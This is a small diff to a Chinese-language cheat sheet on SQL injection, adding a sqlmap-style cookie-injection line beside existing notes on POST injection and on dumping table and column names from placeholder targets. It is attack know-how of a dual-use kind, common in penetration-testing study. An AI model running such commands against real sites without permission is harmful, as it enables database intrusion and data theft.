@@ -56,6 +56,7 @@ php+mysql手工注入
 > -u http://xxx.asp --data"id=114" --level 3
 >  post注入
 
+cookie注入：-u http://xxx.asp --cookie "id=114" --level 2
 
 - `--tables` 爆表
 - `-T 表名 --columns` 爆字段
